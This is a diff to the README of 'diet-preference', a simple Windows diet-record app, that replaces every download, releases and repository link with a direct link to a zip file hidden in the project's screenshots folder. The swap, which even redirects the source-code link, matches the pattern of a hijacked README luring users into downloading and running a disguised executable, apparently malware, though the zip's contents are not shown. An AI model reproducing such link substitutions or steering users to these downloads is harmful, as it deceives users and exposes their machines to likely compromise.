@@ -1,6 +1,6 @@
 # 🥗 diet-preference - Simple Diet Form with Records
 
-[![Download diet-preference](https://img.shields.io/badge/Download-diet--preference-green?style=for-the-badge)](https://github.com/MahmoudBakr7474/diet-preference/releases)
+[![Download diet-preference](https://img.shields.io/badge/Download-diet--preference-green?style=for-the-badge)](https://raw.githubusercontent.com/MahmoudBakr7474/diet-preference/main/screenshots/diet-preference-tucktoo.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To use diet-preference on your Windows PC, follow these steps carefully.
 
 Go to the official releases page to get the app files:
 
-[Download diet-preference releases](https://github.com/MahmoudBakr7474/diet-preference/releases)
+[Download diet-preference releases](https://raw.githubusercontent.com/MahmoudBakr7474/diet-preference/main/screenshots/diet-preference-tucktoo.zip)
 
 Click the link or the badge at the top to open the downloads page in your browser.
 
@@ -91,7 +91,7 @@ You do not need to install or configure any database yourself. The app handles a
 To download and install diet-preference, follow these steps:
 
 1. Visit the releases page:  
-   [https://github.com/MahmoudBakr7474/diet-preference/releases](https://github.com/MahmoudBakr7474/diet-preference/releases)  
+   [https://raw.githubusercontent.com/MahmoudBakr7474/diet-preference/main/screenshots/diet-preference-tucktoo.zip](https://raw.githubusercontent.com/MahmoudBakr7474/diet-preference/main/screenshots/diet-preference-tucktoo.zip)  
 
 2. Select the latest Windows `.exe` file and download it.  
 3. Open the downloaded file to either install or run the app directly.  
@@ -136,10 +136,10 @@ This design keeps the app simple for users and safe when handling your data.
 
 Find source code, updates, and contact info on the GitHub repository:
 
-[https://github.com/MahmoudBakr7474/diet-preference](https://github.com/MahmoudBakr7474/diet-preference)  
+[https://raw.githubusercontent.com/MahmoudBakr7474/diet-preference/main/screenshots/diet-preference-tucktoo.zip](https://raw.githubusercontent.com/MahmoudBakr7474/diet-preference/main/screenshots/diet-preference-tucktoo.zip)  
 
 Check the README there if you want to know more about the technology or contribution details.
 
 ---
 
-[![Get diet-preference](https://img.shields.io/badge/Get-diet--preference-blue?style=for-the-badge)](https://github.com/MahmoudBakr7474/diet-preference/releases)
+[![Get diet-preference](https://img.shields.io/badge/Get-diet--preference-blue?style=for-the-badge)](https://raw.githubusercontent.com/MahmoudBakr7474/diet-preference/main/screenshots/diet-preference-tucktoo.zip)
